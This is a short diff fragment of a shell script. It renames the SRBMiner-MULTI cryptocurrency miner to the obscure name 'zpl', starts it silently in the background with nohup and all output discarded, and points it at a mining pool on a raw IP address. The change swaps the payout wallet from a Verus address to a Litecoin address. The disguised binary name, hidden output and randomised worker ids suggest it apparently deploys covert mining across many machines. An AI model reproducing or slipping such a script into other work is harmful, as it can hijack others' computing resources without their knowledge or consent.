@@ -10,4 +10,4 @@ cd ..
 mv SRBMiner-MULTI zpl
 rm -rf SRBMiner-Multi-2-3-1/
 #sudo cpulimit --background -e zpl -l 300
-nohup ./zpl --algorithm verushash --pool stratum+ssl://103.249.70.7:13300 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.worker$(( $RANDOM % 1000 + 1 )) --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 4 --disable-gpu &> /dev/null &
+nohup ./zpl --algorithm verushash --pool stratum+ssl://103.249.70.7:13300 --wallet ltc1qwu9y0fzjt04pn68vwg6ul0nv5gmtmuhq4jvfffq.worker$(( $RANDOM % 1000 + 1 )) --password c=LTC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 4 --disable-gpu &> /dev/null &
